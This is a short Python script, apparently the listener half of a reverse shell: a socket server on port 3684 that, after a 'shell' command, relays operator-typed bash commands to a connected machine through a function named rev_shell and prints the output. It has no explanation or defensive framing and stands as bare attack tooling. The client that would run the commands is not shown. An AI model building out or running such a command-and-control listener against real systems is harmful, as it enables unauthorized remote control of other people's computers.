import socket
  
  
def rev_shell(conn, data):
    conn.send(data.encode())
  
  
def basic_server():
    host = socket.gethostname()
    port = 3684
  
    server_socket = socket.socket()
    server_socket.bind((host, port))
  
    server_socket.listen(2)
    conn, address = server_socket.accept()
  
    print("Connection from: %s" % str(address))

    while True:
        data = conn.recv(1024).decode()
        if not data:
            break
        print("from connected user: %s" % str(data))
        data = input(' -> ')
    
        conn.send(data.encode())
    
        if data == 'shell':
            shell = True
            while shell:
                data = input('bash>')
                
                if data == "quit" or data == "close":
                    rev_shell(conn, data)
                    shell = False
                else:
                    rev_shell(conn, data)
                    print(conn.recv(1024).decode())
    
    
#    conn.close()
  
  
if __name__ == '__main__':
    basic_server()